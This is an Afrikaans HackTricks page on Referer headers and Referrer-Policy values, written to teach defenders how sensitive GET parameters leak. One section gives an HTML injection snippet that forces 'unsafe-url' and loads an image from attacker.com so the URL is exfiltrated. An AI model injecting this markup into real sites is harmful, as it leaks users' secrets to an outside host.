{{#include ../banners/hacktricks-training.md}}

# Verwysingskoppe en beleid

Verwysing is die kop wat deur blaaiers gebruik word om aan te dui watter die vorige bladsy was wat besoek is.

## Sensitiewe inligting gelekt

As daar op 'n stadium binne 'n webblad enige sensitiewe inligting op 'n GET-versoekparameters geleë is, as die bladsy skakels na eksterne bronne bevat of 'n aanvaller in staat is om die gebruiker te laat besoek 'n URL wat deur die aanvaller beheer word (sosiale ingenieurswese). Dit kan in staat wees om die sensitiewe inligting binne die laaste GET-versoek te eksfiltreer.

## Versagting

Jy kan die blaaiers laat volg 'n **Verwysingsbeleid** wat die sensitiewe inligting kan **verhoed** om na ander webtoepassings gestuur te word:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Teen-Mitigering

Jy kan hierdie reël oorskry deur 'n HTML meta-tag te gebruik (die aanvaller moet 'n HTML-inspuiting benut):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Verdediging

Plaas nooit enige sensitiewe data in GET parameters of paden in die URL nie.

{{#include ../banners/hacktricks-training.md}}
